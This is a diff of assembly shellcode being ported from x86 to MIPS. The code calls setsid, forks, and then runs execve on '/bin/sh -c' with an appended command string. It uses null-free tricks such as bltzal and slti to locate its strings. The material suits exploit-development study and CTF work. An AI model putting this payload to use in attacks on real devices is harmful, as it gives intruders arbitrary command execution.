@@ -1,7 +1,7 @@
 #include <sys/syscall.h>
 
-#define BINSH "/bin/sh\x00"
-#define TACC "-c\x00\x00\x00\x00\x00\x00"
+#define BINSH "/bin/sh\x00\x00\x00\x00"
+#define TACC "-c\x00\x00\x00\x00\x00"
 
 .globl main
 .type main, @function
@@ -25,44 +25,48 @@ setsid:
     syscall
 
 forkexit:
-    // jmp pop_binsh
+    b get_binsh
 
-/*
 ret1:
-    pop ebx
-    jmp pop_tacc
+    sw $ra, -16($sp)
+    lw $a0, -16($sp)
+    b get_tacc
 
 ret2:
-    pop esi
-    jmp pop_userinput
+    sw $ra, -12($sp)
+    b get_userinput
 
 ret3:
-    pop edi
+    add $ra, $ra, 0
+    sw $ra, -8($sp)
+    slti $ra, $zero, -1
+    sw $ra, -4($sp)
 
 binsh:
-    xor eax, eax
-    push eax
-    push edi
-    push esi
-    push ebx
-    mov ecx, esp
-    xor edx, edx
-    mov eax, SYS_execve
-    int 0x80
+    sub $sp, $sp, 16
+    slti $a1, $zero, -1
+    add $a1, $zero, $sp
+    slti $a2, $zero, -1
+    li $v0, SYS_execve
+    syscall
 
 exit:
-    xor ebx, ebx
-    mov eax, SYS_exit
-    int 0x80
+    slti $a0, $zero, -1
+    li $v0, SYS_exit
+    syscall
 
-pop_binsh:
-    call ret1
+get_binsh:
+    li $t0, -1
+    bltzal $t0, ret1
     .string BINSH
 
-pop_tacc:
-    call ret2
+get_tacc:
+    li $t0, -1
+    bltzal $t0, ret2
     .string TACC
 
-pop_userinput:
-    call ret3
-*/
+get_userinput:
+    li $t0, -1
+    bltzal $t0, ret3
+
+user_input:
